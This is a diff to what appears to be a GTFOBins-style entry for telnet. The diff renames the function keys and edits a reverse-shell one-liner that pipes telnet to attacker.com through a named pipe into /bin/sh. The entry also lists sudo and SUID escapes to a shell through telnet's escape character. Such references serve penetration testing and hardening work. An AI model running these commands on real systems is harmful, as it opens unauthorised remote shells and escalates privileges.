@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  shell:
     - description: BSD version only. Needs to be connected first.
       code: |
         RHOST=attacker.com
@@ -13,10 +13,9 @@ functions:
       code: |
         RHOST=attacker.com
         RPORT=12345
-        TF=$(mktemp)
-        rm $TF
-        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
-  sudo-enabled:
+        TF=$(mktemp -u)
+        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
+  sudo:
     - description: BSD version only. Needs to be connected first.
       code: |
         RHOST=attacker.com
@@ -24,7 +23,7 @@ functions:
         sudo telnet $RHOST $RPORT
         ^]
         !/bin/sh
-  suid-limited:
+  limited-suid:
     - description: BSD version only. Needs to be connected first.
       code: |
         RHOST=attacker.com
@@ -32,5 +31,4 @@ functions:
         ./telnet $RHOST $RPORT
         ^]
         !/bin/sh
-
 ---
